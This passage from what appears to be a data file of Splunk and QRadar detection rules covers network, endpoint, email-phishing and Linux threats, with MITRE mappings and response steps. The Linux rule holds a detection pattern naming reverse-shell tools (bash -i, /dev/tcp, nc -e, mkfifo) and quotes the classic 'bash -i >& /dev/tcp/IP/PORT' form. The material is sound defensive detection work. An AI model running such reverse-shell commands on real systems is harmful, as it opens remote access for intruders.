logs:["Firewall logs","IDS/IPS","Network flow data","Port scanning results"],
bestPractice:"Document all intentionally exposed services and their ports. Any inbound connection to non-documented port warrants investigation. Regular port audit of internet-facing hosts. Implement default-deny inbound firewall policy.",
falsePositives:{desc:"Authorized remote access tools, VPN services, game servers, development environments",splunk:`| where NOT (dest_port IN (8443,10443) AND dest_ip IN ("10.0.1.100"))`,qradar:`AND NOT (destinationport IN (8443,10443) AND destinationip = '10.0.1.100')`,allowlist:"Document all approved inbound services. Alert on any new port exposure."},
commonErrors:"NAT may obscure the true internal destination. Dynamic port ranges for specific applications may be broad. Cloud environments have different perimeter models.",
responseActions:"1) Identify what service is running on the destination port. 2) If unknown: investigate for backdoor/reverse shell. 3) Block the port immediately. 4) Scan the target host for malware. 5) Review firewall rules for unauthorized changes."},

{id:"na-6",cat:"network-anomalies",title:"Split Tunnel / VPN Anomaly Detection",mitre:{id:"T1090",name:"Proxy",tactic:"Command and Control"},severity:"Medium",
desc:"Detects VPN split tunneling anomalies where a VPN-connected user simultaneously sends traffic both through the VPN tunnel and directly to the internet, potentially bypassing security controls.",
splunk:`index=vpn sourcetype=vpn
| join type=inner src_ip [search index=firewall direction=outbound
  | where NOT cidrmatch("10.0.0.0/8",dest_ip)
  | stats count by src_ip]
| where vpn_status="connected"
| table _time, user, src_ip, vpn_ip, count`,
qradar:`SELECT sourceip, username, COUNT(*) as direct_connections
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Firewall%'
  AND NOT INCIDR(destinationip,'10.0.0.0/8')
  AND sourceip IN (SELECT sourceip FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%VPN%')
GROUP BY sourceip, username
HAVING COUNT(*) > 10
ORDER BY direct_connections DESC LAST 24 HOURS`,
logs:["VPN gateway logs","Firewall egress logs","DNS split-brain logs","Endpoint security with network visibility"],
bestPractice:"Full tunnel VPN prevents split tunneling. If split tunnel is required: route DNS through VPN, implement always-on VPN, use endpoint security to monitor direct internet traffic. Split tunnel allows C2 traffic to bypass SIEM visibility.",
falsePositives:{desc:"Authorized split tunnel configurations for performance, streaming media exemptions, printing to local network devices",splunk:`| where NOT match(user,"(?i)authorized_split_tunnel_users")`,qradar:`AND NOT username ILIKE '%authorized%'`,allowlist:"Document approved split tunnel users and their business justification."},
commonErrors:"Split tunnel detection requires correlating VPN and firewall logs. Some VPN clients don't report split tunnel status. Endpoint agents provide better visibility than network-level detection.",
responseActions:"1) Verify if split tunnel is authorized for this user. 2) If not: enforce full-tunnel VPN configuration. 3) Review what traffic was sent outside the tunnel. 4) Check for C2 or data exfiltration via direct internet path."},

// ═══════════════════════════════════════
// CATEGORY 18: ENDPOINT ANOMALIES
// ═══════════════════════════════════════
{id:"ea-1",cat:"endpoint-anomalies",title:"Unsigned Binary Execution",mitre:{id:"T1553.002",name:"Subvert Trust Controls: Code Signing",tactic:"Defense Evasion"},severity:"Medium",
desc:"Detects execution of unsigned binaries which may indicate custom malware, attacker tools, or unauthorized software running without valid digital signatures.",
splunk:`index=wineventlog sourcetype=WinEventLog:Sysmon EventCode=1
| where Signed="false" OR SignatureStatus="Unavailable"
| where NOT match(Image,"(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\downloads\\\\|\\\\users\\\\)")
| stats count values(Image) as processes by ComputerName, User, _time
| where count > 3
| table _time, ComputerName, User, processes, count`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as unsigned_events
FROM events WHERE QIDNAME(qid) ILIKE '%Process Create%'
  AND eventname ILIKE '%Unsigned%'
GROUP BY sourceip, username, qid
HAVING COUNT(*) > 3
ORDER BY unsigned_events DESC LAST 24 HOURS`,
logs:["Sysmon Event 1 with signature verification","Windows Security 4688","Application whitelisting logs","EDR process telemetry"],
bestPractice:"Most malware is unsigned. Focus on unsigned binaries running from user-writable locations (temp, appdata, downloads). Implement application whitelisting (AppLocker/WDAC) to block unsigned binaries. Track first-seen unsigned binaries. Correlate with threat intel hash feeds.",
falsePositives:{desc:"In-house developed applications without code signing, portable applications, developer tools compiled locally",splunk:`| where NOT match(Image,"(?i)(\\\\development\\\\|\\\\tools\\\\|company_app)")`,qradar:`AND NOT eventname ILIKE '%development%'`,allowlist:"Sign all in-house applications. Document approved unsigned tools with file hashes."},
commonErrors:"Sysmon signature verification may slow performance. Some signed binaries show 'Unavailable' if certificate is expired. Application whitelisting requires ongoing maintenance.",
responseActions:"1) Identify the unsigned binary and its hash. 2) Check against threat intel (VirusTotal, sandbox). 3) If unknown: quarantine and analyze. 4) If malicious: isolate and investigate. 5) Consider mandating code signing."},

{id:"ea-2",cat:"endpoint-anomalies",title:"Parent-Child Process Anomaly",mitre:{id:"T1055",name:"Process Injection",tactic:"Defense Evasion"},severity:"High",
desc:"Detects unusual parent-child process relationships that don't match expected Windows process hierarchy, indicating potential process injection, masquerading, or exploitation.",
splunk:`index=wineventlog sourcetype=WinEventLog:Sysmon EventCode=1
| where (ParentImage="*\\explorer.exe" AND match(Image,"(?i)(powershell|cmd\\.exe)") AND match(CommandLine,"(?i)(-enc|-hidden|bypass)"))
  OR (ParentImage="*\\services.exe" AND NOT match(Image,"(?i)(svchost|msiexec|spoolsv|taskhost|wininit)"))
  OR (ParentImage="*\\svchost.exe" AND match(Image,"(?i)(powershell|cmd\\.exe|wscript|mshta)"))
  OR (ParentImage="*\\wmiprvse.exe" AND match(Image,"(?i)(powershell|cmd\\.exe)"))
| table _time, ComputerName, User, ParentImage, Image, CommandLine`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as anomaly_events
FROM events WHERE QIDNAME(qid) ILIKE '%Process Create%'
  AND ((eventname ILIKE '%services.exe%' AND NOT eventname ILIKE '%svchost%')
    OR (eventname ILIKE '%svchost%' AND eventname ILIKE '%powershell%'))
GROUP BY sourceip, username, qid
ORDER BY anomaly_events DESC LAST 24 HOURS`,
logs:["Sysmon Event 1 (CRITICAL)","Windows Security 4688 with parent process","EDR process tree analysis","Application whitelisting logs"],
bestPractice:"Windows has well-defined parent-child process relationships. services.exe should only spawn service processes. svchost should not spawn cmd/powershell. explorer.exe spawning hidden PowerShell is suspicious. Document the expected process hierarchy and alert on deviations.",
falsePositives:{desc:"System administration tools, software installers creating service processes, troubleshooting scripts",splunk:`| where NOT (User="SYSTEM" AND match(CommandLine,"(?i)(update|install|setup)"))`,qradar:`AND NOT username = 'SYSTEM'`,allowlist:"Document approved parent-child relationships for management tools."},
commonErrors:"Without Sysmon, parent process tracking is unavailable in standard Windows events. Some legitimate software creates unusual process chains during installation. 4688 only tracks immediate parent, not full ancestry.",
responseActions:"1) Analyze the full process chain. 2) If unexpected parent-child: likely exploitation or injection. 3) Check for malicious command-line arguments. 4) Isolate if confirmed anomaly. 5) Investigate the root cause."},

{id:"ea-3",cat:"endpoint-anomalies",title:"Binary Executing from Temp/AppData",mitre:{id:"T1204.002",name:"User Execution: Malicious File",tactic:"Execution"},severity:"High",
desc:"Detects execution of binaries from temporary directories (Temp, AppData, Downloads) which is a common indicator of malware that was dropped and immediately executed.",
splunk:`index=wineventlog sourcetype=WinEventLog:Sysmon EventCode=1
| where match(Image,"(?i)(\\\\temp\\\\|\\\\tmp\\\\|\\\\appdata\\\\local\\\\temp|\\\\downloads\\\\)") AND match(Image,"(?i)\\.(exe|dll|scr|bat|cmd|ps1|vbs|js)$")
| where NOT match(Image,"(?i)(chrome|firefox|edge|teams|slack|zoom|onedrive|7z|winrar)")
| stats count values(Image) as executables values(CommandLine) as cmds by ComputerName, User, _time
| table _time, ComputerName, User, executables, cmds, count`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as temp_exec
FROM events WHERE QIDNAME(qid) ILIKE '%Process Create%'
  AND (eventname ILIKE '%\\temp\\%' OR eventname ILIKE '%\\appdata\\%' OR eventname ILIKE '%\\downloads\\%')
  AND (eventname ILIKE '%.exe%' OR eventname ILIKE '%.scr%')
GROUP BY sourceip, username, qid
HAVING COUNT(*) > 0
ORDER BY temp_exec DESC LAST 24 HOURS`,
logs:["Sysmon Event 1","Windows Security 4688","File creation monitoring (Sysmon Event 11)","EDR telemetry"],
bestPractice:"Legitimate software rarely runs from Temp permanently. Browser downloads execute from Downloads by design, but unknown executables are suspicious. Combine with file creation time — binary dropped and executed within seconds indicates dropper behavior. Block execution from Temp via AppLocker.",
falsePositives:{desc:"Software installers extracting to Temp during installation, browser-downloaded legitimate software, self-extracting archives",splunk:`| where NOT match(Image,"(?i)(setup|install|update|patch|7z|winrar)")`,qradar:`AND NOT eventname ILIKE '%setup%'`,allowlist:"Whitelist known installer patterns. Block execution from Temp for general users."},
commonErrors:"Many legitimate installers temporarily execute from Temp. User training is needed alongside technical controls. Browser downloads are intentionally saved to Downloads. Short-lived processes may be missed if log collection has delays.",
responseActions:"1) Analyze the binary (hash, signature, sandbox). 2) Check if user intentionally downloaded it. 3) If malware: isolate and remove. 4) Block the download source. 5) Implement AppLocker to prevent future execution from Temp."},

{id:"ea-4",cat:"endpoint-anomalies",title:"New Kernel Driver Loaded",mitre:{id:"T1547.006",name:"Boot or Logon Autostart: Kernel Modules and Extensions",tactic:"Persistence"},severity:"High",
desc:"Detects loading of new kernel drivers which can indicate rootkit installation, vulnerable driver exploitation (BYOVD), or unauthorized kernel-level changes.",
splunk:`index=wineventlog sourcetype=WinEventLog:Sysmon EventCode=6
| where NOT match(ImageLoaded,"(?i)(\\\\windows\\\\system32\\\\drivers\\\\|\\\\system32\\\\ntoskrnl|\\\\system32\\\\ci\\.dll)")
| where Signed="false" OR SignatureStatus!="Valid"
| table _time, ComputerName, ImageLoaded, Signed, SignatureStatus, Hashes`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as driver_events
FROM events WHERE QIDNAME(qid) ILIKE '%Driver Loaded%'
  AND eventname NOT ILIKE '%\\windows\\system32\\drivers\\%'
GROUP BY sourceip, username, qid
ORDER BY driver_events DESC LAST 24 HOURS`,
logs:["Sysmon Event 6 (Driver Loaded)","Windows System Event 7045","Driver signing audit logs","EDR kernel module monitoring"],
bestPractice:"All legitimate drivers should be signed. Unsigned driver loading on modern Windows requires test signing or vulnerable driver exploitation (BYOVD). Monitor for known vulnerable drivers (LOLDrivers project). Enable HVCI to prevent unsigned driver loading.",
falsePositives:{desc:"Hardware installations, driver updates, development machines with test signing enabled",splunk:`| where Signed="false" AND NOT match(ImageLoaded,"(?i)(virtualbox|vmware|development)")`,qradar:`AND NOT eventname ILIKE '%VMware%'`,allowlist:"Document approved drivers with hashes. Alert on any new or unsigned driver."},
commonErrors:"Sysmon Event 6 must be enabled. Some legitimate third-party drivers have expired signatures. BYOVD attacks use legitimately signed but vulnerable drivers. HVCI can break some older drivers.",
responseActions:"1) Identify the driver and its purpose. 2) If unsigned: investigate as potential rootkit. 3) Check against LOLDrivers database. 4) If malicious: boot into safe mode and remove. 5) Enable HVCI to prevent future unsigned driver loading."},

{id:"ea-5",cat:"endpoint-anomalies",title:"Process Hollowing / Injection Indicators",mitre:{id:"T1055.012",name:"Process Injection: Process Hollowing",tactic:"Defense Evasion"},severity:"Critical",
desc:"Detects process hollowing by monitoring for processes that are created in a suspended state and then have their memory unmapped and replaced with malicious code before resuming execution.",
splunk:`index=wineventlog sourcetype=WinEventLog:Sysmon
| where (EventCode=1 AND match(CommandLine,"(?i)CREATE_SUSPENDED"))
  OR (EventCode=8 AND match(TargetImage,"(?i)(svchost|explorer|notepad|calc)"))
  OR (EventCode=10 AND GrantedAccess="0x1fffff" AND match(TargetImage,"(?i)(svchost|explorer)"))
| stats count values(EventCode) as event_types values(TargetImage) as targets by SourceImage, ComputerName, _time
| table _time, ComputerName, SourceImage, targets, event_types, count`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as hollow_events
FROM events WHERE (QIDNAME(qid) ILIKE '%Remote Thread%' OR QIDNAME(qid) ILIKE '%Process Access%')
  AND (eventname ILIKE '%svchost%' OR eventname ILIKE '%explorer%')
GROUP BY sourceip, username, qid
ORDER BY hollow_events DESC LAST 24 HOURS`,
logs:["Sysmon Events 1, 8, 10","Windows Security 4688","EDR memory analysis","Volatility memory forensics"],
bestPractice:"Process hollowing creates a legitimate process suspended, unmaps its memory, writes malicious code, then resumes. Sysmon Event 8 (CreateRemoteThread) into common process names is a strong signal. Full memory forensics can confirm hollowing. EDR tools provide better visibility for this technique.",
falsePositives:{desc:"Some security tools inject into processes for monitoring, debuggers, .NET CLR injection for profiling",splunk:`| where NOT match(SourceImage,"(?i)(MsMpEng|defender|crowdstrike)")`,qradar:`AND NOT eventname ILIKE '%defender%'`,allowlist:"Whitelist known security products that legitimately inject."},
commonErrors:"Process hollowing is hard to detect from event logs alone — EDR provides better coverage. Sysmon Event 8 may miss some injection techniques. Direct syscalls bypass Sysmon entirely. Memory analysis (Volatility) is the definitive detection method.",
responseActions:"1) CRITICAL — confirmed malware using advanced evasion. 2) Isolate the endpoint. 3) Perform memory forensics to extract injected code. 4) Identify the malware family. 5) Hunt for the injection source. 6) Full IR."},

{id:"ea-6",cat:"endpoint-anomalies",title:"Executable Dropped and Immediately Run",mitre:{id:"T1204.002",name:"User Execution: Malicious File",tactic:"Execution"},severity:"High",
desc:"Detects the dropper pattern where a file is created and executed within seconds, characteristic of malware droppers, payload delivery, and exploit post-exploitation chains.",
splunk:`index=wineventlog sourcetype=WinEventLog:Sysmon
| where EventCode=11 AND match(TargetFilename,"(?i)\\.(exe|dll|scr|bat|cmd|ps1)$")
| join type=inner TargetFilename [search index=wineventlog sourcetype=WinEventLog:Sysmon EventCode=1
  | rename Image as TargetFilename]
| eval create_to_exec=_time - CreationUtcTime
| where create_to_exec < 30 AND create_to_exec >= 0
| table _time, ComputerName, User, TargetFilename, create_to_exec, CommandLine`,
qradar:`SELECT sourceip, username, COUNT(*) as drop_exec_events
FROM events WHERE QIDNAME(qid) ILIKE '%File Create%'
  AND (eventname ILIKE '%.exe%' OR eventname ILIKE '%.scr%')
GROUP BY sourceip, username
HAVING COUNT(*) > 1
ORDER BY drop_exec_events DESC LAST 4 HOURS`,
logs:["Sysmon Events 1 and 11","Windows Security 4688 and 4663","EDR file creation and execution timeline"],
bestPractice:"File creation followed by execution within <30 seconds is the dropper pattern. Focus on user-writable directories (Temp, AppData, Downloads). Legitimate installers also follow this pattern but are usually signed. Combine with signature verification for high-fidelity detection.",
falsePositives:{desc:"Software installation, auto-updates extracting and running, browser downloads followed by manual execution",splunk:`| where create_to_exec < 5 AND NOT match(TargetFilename,"(?i)(setup|install|update)")`,qradar:`AND NOT eventname ILIKE '%setup%'`,allowlist:"Whitelist signed installer patterns. Focus on unsigned or unknown binaries."},
commonErrors:"Correlating file creation and execution requires both Sysmon Event 11 and Event 1. Timestamps must be precise. Long-running installations may look like dropper patterns. Some legitimate software uses temporary executables.",
responseActions:"1) Analyze the dropped binary (hash, sandbox). 2) Identify the dropper process that created the file. 3) If malicious: quarantine the binary and isolate the host. 4) Trace back to the delivery mechanism. 5) Block the file hash across endpoints."},

// ═══════════════════════════════════════
// CATEGORY 19: EMAIL THREATS
// ═══════════════════════════════════════
{id:"em-1",cat:"email-threats",title:"Macro-Enabled Attachment (.xlsm, .docm)",mitre:{id:"T1566.001",name:"Phishing: Spearphishing Attachment",tactic:"Initial Access"},severity:"High",
desc:"Detects delivery of macro-enabled Office documents (.xlsm, .docm, .pptm) via email, the primary delivery mechanism for malware-laden phishing campaigns.",
splunk:`index=email sourcetype=mail
| where match(attachment_name,"(?i)\\.(xlsm|docm|pptm|dotm|xltm|xlam|ppam|sldm)$")
| stats count dc(recipient) as unique_recipients values(recipient) as targets by sender, attachment_name, subject, _time
| table _time, sender, subject, attachment_name, unique_recipients, targets`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as macro_emails
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Mail%'
  AND (eventname ILIKE '%.xlsm%' OR eventname ILIKE '%.docm%' OR eventname ILIKE '%.pptm%')
GROUP BY username, sourceip, qid
ORDER BY macro_emails DESC LAST 24 HOURS`,
logs:["Email gateway logs","Exchange message tracking","O365 mail flow rules","Email sandbox/detonation results"],
bestPractice:"Block macro-enabled attachments at the email gateway for most users. Implement email sandboxing for detonation analysis. Strip macros from attachments at the gateway. Use GPO to disable macros from internet-sourced documents (Mark of the Web).",
falsePositives:{desc:"Legitimate business macro-enabled documents (finance reports, HR templates)",splunk:`| where NOT (sender="finance@company.com" AND match(attachment_name,"(?i)report"))`,qradar:`AND NOT username = 'finance'`,allowlist:"Document approved macro-enabled document sources. Route through sandboxing before delivery."},
commonErrors:"Some email gateways only check file extension, not content. Renamed extensions bypass filtering. Embedded macros in OLE objects may not be detected. Password-protected archives containing macros bypass scanning.",
responseActions:"1) Quarantine the email. 2) If already delivered: recall if possible, notify recipients. 3) If opened: check for macro execution (Office spawning cmd/powershell). 4) Block sender domain. 5) Submit attachment to sandbox for analysis."},

{id:"em-2",cat:"email-threats",title:"Suspicious Sender Domain (Lookalike)",mitre:{id:"T1566.002",name:"Phishing: Spearphishing Link",tactic:"Initial Access"},severity:"High",
desc:"Detects potential phishing from domains that closely resemble legitimate business domains using typosquatting, homograph attacks, or domain impersonation techniques.",
splunk:`index=email sourcetype=mail
| rex field=sender ".*@(?<sender_domain>.+)$"
| where NOT sender_domain="company.com" AND NOT sender_domain="partner.com"
| eval levenshtein_similar=if(match(sender_domain,"(?i)(c0mpany|cornpany|company\\.co|companny|compay|company-inc|companv)"),1,0)
| where levenshtein_similar=1
| stats count dc(recipient) as targets values(subject) as subjects by sender, sender_domain, _time
| table _time, sender, sender_domain, subjects, targets, count`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as lookalike_emails
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Mail%'
  AND (eventname ILIKE '%c0mpany%' OR eventname ILIKE '%cornpany%'
    OR eventname ILIKE '%companny%')
GROUP BY username, sourceip, qid
ORDER BY lookalike_emails DESC LAST 24 HOURS`,
logs:["Email gateway logs","DMARC/SPF/DKIM validation results","Domain monitoring services","Threat intelligence phishing feeds"],
bestPractice:"Maintain a list of known lookalike domains. Implement DMARC enforcement. Use cousin domain monitoring services. Flag emails from domains with edit distance <3 from company domain. Check for homograph characters (Cyrillic 'a' vs Latin 'a').",
falsePositives:{desc:"Legitimate subsidiary or partner domains that happen to be similar, newly onboarded vendor domains",splunk:`| where levenshtein_similar=1 AND NOT sender_domain IN ("company-subsidiary.com")`,qradar:`AND NOT sourceip ILIKE '%subsidiary%'`,allowlist:"Document all approved similar domains. Alert on all others."},
commonErrors:"Simple regex matching misses sophisticated lookalikes. Unicode/punycode domains require special handling. Some email gateways don't expose sender domain for analysis. DMARC/SPF failures should be separate but correlated.",
responseActions:"1) Quarantine emails from the lookalike domain. 2) Alert all recipients. 3) Register the lookalike domain defensively if available. 4) Report to domain registrar for takedown. 5) Update email gateway rules to block the domain."},

{id:"em-3",cat:"email-threats",title:"Email Forwarding Rule to External Address",mitre:{id:"T1114.003",name:"Email Collection: Email Forwarding Rule",tactic:"Collection"},severity:"High",
desc:"Detects creation of inbox rules that forward, redirect, or copy emails to external email addresses — a key indicator of Business Email Compromise (BEC) and persistent email exfiltration.",
splunk:`index=o365 sourcetype=o365:management:activity
  (Operation="New-InboxRule" OR Operation="Set-InboxRule" OR Operation="Set-Mailbox")
| where match(Parameters,"(?i)(ForwardTo|ForwardAsAttachmentTo|RedirectTo)")
  AND match(Parameters,"(?i)@(?!company\\.com)")
| table _time, UserId, Operation, Parameters, ClientIP, UserAgent`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as forward_rules
FROM events WHERE (QIDNAME(qid) ILIKE '%Inbox Rule%' OR eventname ILIKE '%New-InboxRule%')
  AND (eventname ILIKE '%Forward%' OR eventname ILIKE '%Redirect%')
GROUP BY username, sourceip, qid
ORDER BY forward_rules DESC LAST 24 HOURS`,
logs:["O365 Unified Audit Log","Exchange Admin Audit Log","Azure AD Sign-in logs for correlation","Mailbox audit logs"],
bestPractice:"Block external forwarding via Exchange transport rules. Alert on any new forwarding rules. Regularly audit existing rules with Get-InboxRule. BEC attackers create forwarding rules within minutes of compromise. Check for hidden rules (not visible in Outlook UI).",
falsePositives:{desc:"Legitimate forwarding for shared mailboxes, executive assistants managing email, automated workflows",splunk:`| where NOT UserId IN ("shared_inbox@company.com","assistant@company.com")`,qradar:`AND NOT username IN ('shared_inbox','assistant')`,allowlist:"Document approved external forwarding. Any personal email forwarding is high-risk."},
commonErrors:"O365 audit logs have up to 24h ingestion delay. EWS-created rules may not generate the same audit events. Transport rules override inbox rules. Check for both inbox rules and transport rules.",
responseActions:"1) Immediately remove the forwarding rule. 2) Force password reset and revoke sessions. 3) Enable MFA. 4) Review what emails were forwarded. 5) If BEC: check for financial fraud, invoice modification. 6) Notify affected parties."},

{id:"em-4",cat:"email-threats",title:"Internal Mass Email Send",mitre:{id:"T1534",name:"Internal Spearphishing",tactic:"Lateral Movement"},severity:"Medium",
desc:"Detects a single user sending an abnormally high number of emails internally, which may indicate compromised account used for internal phishing or spam distribution.",
splunk:`index=email sourcetype=mail direction=internal
| bin _time span=1h
| stats count dc(recipient) as unique_recipients by sender, _time
| where count > 50 AND unique_recipients > 20
| table _time, sender, count, unique_recipients`,
qradar:`SELECT username, COUNT(*) as emails_sent,
  COUNT(DISTINCT destinationip) as unique_recipients
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Exchange%'
  AND eventdirection = 'L2R'
GROUP BY username
HAVING COUNT(*) > 50
ORDER BY emails_sent DESC LAST 4 HOURS`,
logs:["Exchange message tracking","O365 mail flow logs","Email gateway logs","DLP email monitoring"],
bestPractice:"Baseline per-user internal email volume. >50 emails to >20 unique recipients in 1 hour is unusual for most users. Internal phishing is particularly dangerous because recipients trust internal senders. Implement rate limiting on internal email.",
falsePositives:{desc:"Company-wide announcements, HR mass communications, marketing team internal distribution, IT notifications",splunk:`| where NOT sender IN ("hr@company.com","it-notify@company.com","ceo@company.com")`,qradar:`AND NOT username IN ('hr','it-notify')`,allowlist:"Document authorized mass email senders. Use distribution lists instead of individual addresses."},
commonErrors:"Distribution lists may show as many individual recipients. Email sent to all-company list counts as one send in some systems. Delayed delivery may spread volume across time windows.",
responseActions:"1) Verify with the sender if intended. 2) If unaware: account compromised — reset password, revoke sessions. 3) If internal phishing: alert all recipients, quarantine message. 4) Check for malicious links or attachments in the mass email."},

{id:"em-5",cat:"email-threats",title:"Attachment with Double Extension",mitre:{id:"T1036.007",name:"Masquerading: Double File Extension",tactic:"Defense Evasion"},severity:"High",
desc:"Detects email attachments using double file extensions (e.g., invoice.pdf.exe) to trick users into opening executable files that appear to be documents.",
splunk:`index=email sourcetype=mail
| where match(attachment_name,"(?i)\\.(pdf|doc|xls|jpg|png|txt)\\.(exe|scr|bat|cmd|vbs|js|ps1|hta|pif|com)$")
| table _time, sender, recipient, subject, attachment_name`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as double_ext
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Mail%'
  AND (eventname ILIKE '%.pdf.exe%' OR eventname ILIKE '%.doc.exe%'
    OR eventname ILIKE '%.xls.scr%' OR eventname ILIKE '%.jpg.exe%')
GROUP BY username, sourceip, qid
ORDER BY double_ext DESC LAST 24 HOURS`,
logs:["Email gateway logs","Exchange message tracking","Email sandbox analysis","DLP content inspection"],
bestPractice:"Double file extensions are ALWAYS malicious — zero legitimate use case. Block at email gateway. Windows hides known extensions by default, so 'invoice.pdf.exe' appears as 'invoice.pdf'. Also check for right-to-left override character (\u202E) used to reverse filename display.",
falsePositives:{desc:"Essentially none. Double extensions in email attachments have no legitimate purpose.",splunk:`| eval _comment="No false positive exclusions — this is always malicious"`,qradar:`-- No exclusions needed`,allowlist:"No allowlist. Double extensions should always be blocked and investigated."},
commonErrors:"Some email gateways only check the last extension. Unicode filename tricks may bypass detection. Password-protected archives hide the inner filename from scanning.",
responseActions:"1) Quarantine the email immediately. 2) If delivered: alert the recipient, recall if possible. 3) If opened: treat as malware execution — isolate endpoint. 4) Block the sender domain. 5) Submit attachment for sandbox analysis."},

{id:"em-6",cat:"email-threats",title:"Executive Impersonation Keywords",mitre:{id:"T1566.002",name:"Phishing: Spearphishing Link",tactic:"Initial Access"},severity:"Medium",
desc:"Detects BEC (Business Email Compromise) attempts by monitoring for emails with executive impersonation keywords in subjects or sender names combined with urgency indicators.",
splunk:`index=email sourcetype=mail
| where match(subject,"(?i)(wire transfer|urgent payment|invoice change|bank account update|confidential request|please process|quick favor|gift cards|W-2|tax forms)")
  AND match(sender_name,"(?i)(CEO|CFO|President|Director|VP )")
  AND NOT match(sender,"@company\\.com$")
| table _time, sender, sender_name, recipient, subject`,
qradar:`SELECT username, sourceip, QIDNAME(qid) as event_name, COUNT(*) as bec_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Mail%'
  AND (eventname ILIKE '%wire transfer%' OR eventname ILIKE '%urgent payment%'
    OR eventname ILIKE '%gift card%' OR eventname ILIKE '%invoice change%')
GROUP BY username, sourceip, qid
ORDER BY bec_events DESC LAST 24 HOURS`,
logs:["Email gateway logs","O365 mail flow","Anti-phishing/BEC solution alerts","DMARC validation results"],
bestPractice:"Implement executive display name impersonation protection in email gateway. Use DMARC enforcement to prevent domain spoofing. Train finance team on BEC red flags. Establish out-of-band verification for wire transfer requests. Add [EXTERNAL] tags to all external emails as visual indicator.",
falsePositives:{desc:"Legitimate urgent business communications from executives, partner companies with similar executive titles",splunk:`| where NOT sender="ceo@company.com" AND match(subject,"(?i)(wire|payment|invoice|bank)")`,qradar:`AND NOT username = 'ceo'`,allowlist:"Implement executive display name protection at the gateway rather than SIEM allowlisting."},
commonErrors:"BEC emails are often text-only (no attachments/links) making them hard to detect. Display name spoofing doesn't require domain compromise. Some BEC uses compromised executive accounts (internal). Subject line keywords change with trends.",
responseActions:"1) Quarantine suspicious BEC emails. 2) Alert the impersonated executive. 3) If finance was targeted: verify no wire transfers were processed. 4) If payment was made: contact bank immediately for recall. 5) Report to FBI IC3 (US) or equivalent."},

// ═══════════════════════════════════════
// CATEGORY 20: LINUX/UNIX THREATS
// ═══════════════════════════════════════
{id:"lx-1",cat:"linux-threats",title:"Reverse Shell Indicators (bash -i, /dev/tcp)",mitre:{id:"T1059.004",name:"Unix Shell",tactic:"Execution"},severity:"Critical",
desc:"Detects reverse shell execution on Linux by monitoring for known reverse shell patterns including bash -i redirections to /dev/tcp, netcat listeners, and Python/Perl reverse shells.",
splunk:`index=linux_secure sourcetype=linux_secure
| where match(_raw,"(?i)(bash\\s+-i|/dev/tcp/|nc\\s+-e|ncat\\s+-e|python.*socket.*connect|perl.*socket.*INET|ruby.*TCPSocket|php.*fsockopen|mkfifo.*nc)")
| table _time, host, user, _raw`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as shell_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Linux%'
  AND (eventname ILIKE '%/dev/tcp%' OR eventname ILIKE '%bash -i%'
    OR eventname ILIKE '%nc -e%' OR eventname ILIKE '%socket%connect%')
GROUP BY sourceip, username, qid
ORDER BY shell_events DESC LAST 24 HOURS`,
logs:["Linux auditd logs","bash history","Syslog","Process execution logs (auditd execve)","EDR agent for Linux"],
bestPractice:"Reverse shells are almost ALWAYS malicious. bash -i >& /dev/tcp/IP/PORT is the classic pattern. Monitor for outbound connections from shell processes. Implement auditd with execve monitoring. Use network egress filtering to block unauthorized outbound connections.",
falsePositives:{desc:"Very rare — some IT automation scripts may use /dev/tcp for health checks",splunk:`| where NOT (host IN ("automation-server") AND match(_raw,"healthcheck"))`,qradar:`AND NOT sourceip ILIKE 'automation%'`,allowlist:"Document any legitimate /dev/tcp usage with specific server exceptions."},
commonErrors:"auditd must be configured to capture execve syscalls. Some reverse shells use encoded commands. Python/Perl one-liners may not appear in auth.log. Bash history can be cleared.",
responseActions:"1) CRITICAL — active remote shell access. 2) Identify and kill the reverse shell process. 3) Block the outbound C2 connection at firewall. 4) Isolate the system. 5) Determine how the attacker gained initial access. 6) Full IR."},

{id:"lx-2",cat:"linux-threats",title:"Crontab Modification",mitre:{id:"T1053.003",name:"Scheduled Task/Job: Cron",tactic:"Persistence"},severity:"High",
desc:"Detects modifications to cron jobs which are commonly used for persistence on Linux systems. Attackers add cron entries to maintain C2 callbacks, cryptocurrency mining, or other persistent activities.",
splunk:`index=linux_secure sourcetype=linux_secure ("crontab" OR "CRON")
| where match(_raw,"(?i)(crontab.*-e|REPLACE|new cron|cron.*EDIT)")
  OR match(_raw,"(?i)(/var/spool/cron|/etc/crontab|/etc/cron\\.d)")
| table _time, host, user, _raw`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as cron_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Linux%'
  AND (eventname ILIKE '%crontab%' OR eventname ILIKE '%cron%EDIT%'
    OR eventname ILIKE '%cron.d%')
GROUP BY sourceip, username, qid
ORDER BY cron_events DESC LAST 24 HOURS`,
logs:["Linux auth.log/secure","Syslog","Cron daemon logs","auditd file monitoring on cron directories","File Integrity Monitoring"],
bestPractice:"Monitor both user crontabs (/var/spool/cron/) and system crontabs (/etc/crontab, /etc/cron.d/). Common malicious cron patterns: downloading and executing scripts, reverse shell callbacks, cryptocurrency miners. Implement FIM on cron directories.",
